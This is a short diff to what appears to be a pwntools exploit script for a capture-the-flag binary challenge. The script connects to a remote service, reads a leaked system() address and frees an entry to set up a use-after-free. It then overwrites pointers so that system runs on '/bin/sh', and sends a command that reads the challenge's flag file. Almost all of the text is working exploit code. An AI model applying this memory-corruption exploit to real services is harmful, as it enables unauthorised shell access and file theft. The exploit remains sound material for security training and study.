@@ -39,12 +39,7 @@ def trigger(r, idx: int):
 def main():
     r = remote("10.113.184.121", 10057)
     # r = process("./chal")
-    # # attach(
-    # #     r,
-    # #     gdbscript="""
-    # #        b main
-    # #        """,
-    # # )
+
     r.recvuntil(b"gift1: ")
     sys_addr = int(r.recvline().strip(), 16)
     log.info(f"{sys_addr = :x}")
@@ -55,16 +50,14 @@ def main():
     register(r, 0)
     register(r, 1)
     set_name(r, 1, 0x10, b"/bin/sh\x00")
-    # attach(
-    #     r,
-    #     gdbscript="""
-    #        b main
-    #        """,
-    # )
+
     unregister(r, 0)
     set_name(r, 1, 0x18, p64(0) + p64(base + 0x60) + p64(sys_addr))
     trigger(r, 0)
-    r.interactive()
+    r.recvline()
+    r.sendline(b"cat /home/chal/flag.txt")
+    print(r.recvline().decode().strip())
+    r.close()
 
 
 if __name__ == "__main__":
